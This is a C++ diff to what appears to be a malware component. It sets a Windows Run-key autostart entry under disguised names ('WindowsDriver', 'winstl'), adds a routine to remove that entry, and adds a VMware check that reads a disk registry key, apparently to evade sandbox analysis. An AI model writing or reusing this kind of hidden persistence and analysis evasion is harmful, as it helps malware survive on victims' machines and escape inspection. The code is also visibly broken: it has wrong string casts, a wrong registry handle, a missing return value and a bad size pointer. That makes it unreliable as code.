@@ -3,14 +3,13 @@
 #include "screen.h"
 
 int Sys::AddToRegistry() {
-  std::wstring exe = L"blxr.exe";
   std::wstring fullPath;
   WCHAR dest[0xFFF];
   GetModuleFileNameW(nullptr, dest, MAX_PATH);
 
   HKEY hkey = nullptr;
   LSTATUS retRck = RegCreateKeyEx(HKEY_CURRENT_USER,
-								  reinterpret_cast<LPCSTR>(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
+								  reinterpret_cast<LPCSTR>(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDriver"),
 								  0,
 								  nullptr,
 								  REG_OPTION_NON_VOLATILE,
@@ -22,10 +21,36 @@ int Sys::AddToRegistry() {
 	return retRck;
   }
   LSTATUS stat = RegSetValueEx(HKEY_CURRENT_USER,
-							   reinterpret_cast<LPCSTR>(L"blxr"),
+							   reinterpret_cast<LPCSTR>(L"winstl"),
 							   0,
 							   REG_SZ,
 							   (LPBYTE)dest,
 							   (fullPath.size() + 1) * sizeof(wchar_t));
   return stat;
 }
+
+int Sys::RemoveFromRegistry() {
+  HKEY hkey;
+  LSTATUS retRok = RegOpenKeyEx(HKEY_CURRENT_USER,
+								reinterpret_cast<LPCSTR>(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
+								0,
+								KEY_ALL_ACCESS,
+								&hkey);
+  if (retRok != ERROR_SUCCESS) {
+	return retRok;
+  }
+  LSTATUS retRdk = RegDeleteValue(hkey, reinterpret_cast<LPCSTR>(L"winstl"));
+  RegCloseKey(hkey);
+}
+
+bool Sys::CheckForVirtualMachine() {
+  HKEY hKey;
+  char lszValue[256];
+
+  RegOpenKeyExA(HKEY_LOCAL_MACHINE, R"(SYSTEM\CurrentControlSet\Services\Disk\Enum)", 0L, KEY_READ, &hKey);
+  RegQueryValueA(hKey, "0", lszValue, (PLONG)sizeof(lszValue));
+  RegCloseKey(hKey);
+
+  return strstr(lszValue, "VMware") != nullptr;
+}
+
